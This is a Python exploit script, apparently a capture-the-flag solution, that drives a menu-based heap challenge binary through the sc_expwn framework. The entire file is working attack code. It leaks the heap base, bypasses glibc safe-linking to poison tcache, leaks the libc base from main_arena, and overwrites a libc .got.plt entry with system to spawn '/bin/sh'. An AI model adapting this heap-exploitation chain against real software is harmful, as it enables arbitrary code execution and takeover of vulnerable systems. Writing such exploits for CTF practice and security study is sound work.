#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = '../distfiles/chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':'set follow-fork-mode parent'}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'localhost', 'port':7352})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = '../distfiles/libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_tzname      = libc.symbols['tzname']
offset_libc_mainarena   = offset_libc_tzname - 0x8a0
offset_libc_gotplt      = libc.sep_section['.got.plt']

#==========

def attack(conn, **kwargs):
    re = Re(conn)

    re.edit(0, 0x58)
    re.edit(0, 0)
    re.edit(1, 0x58)
    re.edit(0, 0)

    addr_heap_base = u(re.list()[1]) << 12
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    re.edit(2, 0x58)
    re.edit(2, 0x18)
    re.edit(3, 0x38)
    re.edit(3, 0)

    re.edit(1, 0x48, flat(0xdeadbeef, 0xcafebabe, 0, 0x91, (addr_heap_base+0x2c0) ^ (addr_heap_base>>12)))
    re.edit(1, 0x48, flat((addr_heap_base+0x10) ^ (addr_heap_base>>12), 0xcafebabe))

    re.edit(4, 0x18)
    re.edit(5, 0x18, flat(0x0000000300000000, 0x0007000000000000))

    re.edit(6, 0x38)
    re.edit(3, 0)

    addr_libc_mainarena = u(re.list()[6]) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system     = libc.sep_function['system']
    addr_libc_gotplt     = libc.address + offset_libc_gotplt

    re.edit(7, 0x18, p64((addr_libc_gotplt+0x40) ^ (addr_heap_base>>12)))
    re.edit(9, 0x38, b'; exec /bin/sh # ')
    re.edit(8, 0x38, p64(addr_libc_system))

    conn.sendline(b'2')

class Re:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def edit(self, idx, size, data = b''):
        self.sendlineafter(b'> ', b'1')
        self.sendlineafter(b': ', str(idx).encode())
        self.sendlineafter(b': ', str(size).encode())
        if size > 0:
            self.sendlineafter(b': ', data)

    def list(self):
        self.sendlineafter(b'> ', b'2')
        return {int(x[1:2]): x[4:] for x in self.recvuntil(b'\n\nMENU', drop=True).split(b'\n')}

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()

if __name__=='__main__':
    main()

#==========
